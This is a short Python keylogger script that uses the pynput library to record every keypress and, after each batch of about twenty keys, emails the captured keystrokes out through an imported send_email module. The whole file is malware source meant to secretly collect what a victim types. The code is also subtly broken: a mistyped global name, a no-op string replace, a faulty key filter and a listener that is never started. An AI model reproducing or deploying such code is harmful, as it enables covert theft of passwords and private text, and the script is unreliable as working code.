import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def on_press(key):
    print(key, end = "")
    print("pressed")
    global Keys, count
    keys.append(str(key) + '\n')
    count +=1
    if count > 20:
        count=0
        email(keys)
        
def email(keys):
    message = ""
    for key in keys :
        k = key.replace("", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key")>0:
            k = ""
        message += k
        print("message")
        send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False